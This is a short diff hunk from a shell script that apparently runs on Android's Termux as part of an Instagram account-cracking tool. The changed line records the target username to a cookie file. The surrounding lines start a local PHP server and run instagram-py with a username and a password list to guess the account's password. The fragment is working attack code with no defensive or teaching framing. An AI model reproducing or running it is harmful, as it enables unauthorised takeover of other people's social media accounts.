@@ -942,7 +942,7 @@ copy
 banners
 cd /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt >/dev/null 2>&1
+echo "  User : $username " >> /data/data/com.termux/files/usr/cookies/cookie.txt >/dev/null 2>&1
 instagram-py --username $username --password-list $value
 xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
 sleep 3
